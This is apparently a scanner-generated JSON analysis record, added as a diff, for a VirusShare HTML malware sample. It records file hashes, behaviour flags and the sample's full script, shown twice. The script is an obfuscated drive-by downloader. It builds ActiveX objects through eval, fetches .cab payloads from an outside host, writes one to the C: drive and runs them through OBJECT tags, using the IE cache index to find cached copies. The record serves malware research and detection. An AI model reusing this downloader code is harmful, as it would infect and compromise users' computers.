@@ -1,0 +1,83 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "Open": "May open a file",
+            "WINDOWS": "May enumerate application windows",
+            "write": "May write to a file"
+        },
+        "macro": "<iframe name=ifr id=ifr>x</iframe>\n<SCRIPT>\n\nvar tmp=''+document.location.href;\nvar cust=tmp.split(/cust/)[1];\ncust = cust.replace(/[^0-9]/g, \"\");\n\n    var URL = 'http://www2.log'+'ih.com/files/ied_s7_'+cust+'.cab?2';\n    try {\n\tvar x;\n\teval('x = new Act'+'iveXO'+'bject(\"Micros'+'oft.XMLH'+'TTP\")'); \n    \tx.Open(\"GET\",URL,0); \n    \tx.Send(); \n\tvar s;\n\teval ('s = new Act'+'iveXOb'+'ject(\"A'+'DOD'+'B.St'+'ream\")');\n\teval(\"s.M\"+\"ode = 3\");\n\teval(\"s.T\"+\"ype = 1\");\n\teval(\"s.O\"+\"pen()\");\n\teval(\"s.W\"+\"rite(x.responseBody)\");\n\teval('s.S'+'aveToFile(\"C:\\\\\\\\ied_s7.cab\",2)');\n    }\n    catch(ex) {\n        URL = 'http://www2.log'+'ih.com/files/explorer'+cust+'.cab';\n \tvar f0;\n \teval ('f0=new Act'+'iveXOb'+'ject(\"Microsoft.XML'+'HTTP\")');\n\tf0.Open(\"GET\",URL, false); \n\tf0.Send();\n\txxy=GetObject(\"C:/WINDOWS/Tempor~1/Content.IE5/INDEX.DAT\",\"htmlfile\");\n\tvar x=setTimeout(\"iecache_step2();\",1000);\n    }\n    \n    \n    function iecache_step2(){\n\tvar aa = new Array();\n   \tvar bb =xxy.body.innerText.substr(30,80).match(/[A-Z0-9]{9}/g);\n\tif (bb && bb.length == 4) {\n\t for (i=0;i<bb.length;i++) {\n\t\taa[aa.length] = bb[i].substr(0,8);\n\t\taa[aa.length] = bb[i].substr(1,8);\n\t }\n\t} else {\n\t\taa=xxy.body.innerText.substr(30,80).match(/[A-Z0-9]{8}/g);\n\t}\t\n\tfor(var ii=0;ii<aa.length;ii++) {\n\t\tifr.document.write(aa[ii] + '<OBJECT CLASSID=clsid:11111111-1111-1111-1111-111111113458 CODEBASE=C:/WINDOWS/Tempor~1/Content.IE5/' + aa[ii] + '/explorer'+cust+'[1].cab ID=i></OBJECT><br>');\n\t}\n\n    }\n</SCRIPT>\n<OBJECT CLASSID=clsid:11111111-1111-1111-1111-111191113457 CODEBASE=c:/ied_s7.cab ID=i></OBJECT>\n"
+    },
+    "filename": "VirusShare_2bcdf48d599bb19e8bc5cb7334f283ee",
+    "filesize": 1638,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "2bcdf48d599bb19e8bc5cb7334f283ee",
+        "sha1": "e0f326c8708999984aa66490e925cc4a830334bf",
+        "sha256": "044986f0c9d6c5dcd2cfc50f7e8f27bf809cc9f7c9ca0fd26566280629bea0b5"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<iframe name=ifr id=ifr>x</iframe>",
+            "<SCRIPT>",
+            "var tmp=''+document.location.href;",
+            "var cust=tmp.split(/cust/)[1];",
+            "cust = cust.replace(/[^0-9]/g, \"\");",
+            "    var URL = 'http://www2.log'+'ih.com/files/ied_s7_'+cust+'.cab?2';",
+            "    try {",
+            "\tvar x;",
+            "\teval('x = new Act'+'iveXO'+'bject(\"Micros'+'oft.XMLH'+'TTP\")'); ",
+            "    \tx.Open(\"GET\",URL,0); ",
+            "    \tx.Send(); ",
+            "\tvar s;",
+            "\teval ('s = new Act'+'iveXOb'+'ject(\"A'+'DOD'+'B.St'+'ream\")');",
+            "\teval(\"s.M\"+\"ode = 3\");",
+            "\teval(\"s.T\"+\"ype = 1\");",
+            "\teval(\"s.O\"+\"pen()\");",
+            "\teval(\"s.W\"+\"rite(x.responseBody)\");",
+            "\teval('s.S'+'aveToFile(\"C:\\\\\\\\ied_s7.cab\",2)');",
+            "    }",
+            "    catch(ex) {",
+            "        URL = 'http://www2.log'+'ih.com/files/explorer'+cust+'.cab';",
+            " \tvar f0;",
+            " \teval ('f0=new Act'+'iveXOb'+'ject(\"Microsoft.XML'+'HTTP\")');",
+            "\tf0.Open(\"GET\",URL, false); ",
+            "\tf0.Send();",
+            "\txxy=GetObject(\"C:/WINDOWS/Tempor~1/Content.IE5/INDEX.DAT\",\"htmlfile\");",
+            "\tvar x=setTimeout(\"iecache_step2();\",1000);",
+            "    }",
+            "    ",
+            "    ",
+            "    function iecache_step2(){",
+            "\tvar aa = new Array();",
+            "   \tvar bb =xxy.body.innerText.substr(30,80).match(/[A-Z0-9]{9}/g);",
+            "\tif (bb && bb.length == 4) {",
+            "\t for (i=0;i<bb.length;i++) {",
+            "\t\taa[aa.length] = bb[i].substr(0,8);",
+            "\t\taa[aa.length] = bb[i].substr(1,8);",
+            "\t} else {",
+            "\t\taa=xxy.body.innerText.substr(30,80).match(/[A-Z0-9]{8}/g);",
+            "\tfor(var ii=0;ii<aa.length;ii++) {",
+            "\t\tifr.document.write(aa[ii] + '<OBJECT CLASSID=clsid:11111111-1111-1111-1111-111111113458 CODEBASE=C:/WINDOWS/Tempor~1/Content.IE5/' + aa[ii] + '/explorer'+cust+'[1].cab ID=i></OBJECT><br>');",
+            "    }",
+            "</SCRIPT>",
+            "<OBJECT CLASSID=clsid:11111111-1111-1111-1111-111191113457 CODEBASE=c:/ied_s7.cab ID=i></OBJECT>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www2.log"
+        ]
+    },
+    "time": "0:00:00.273025",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
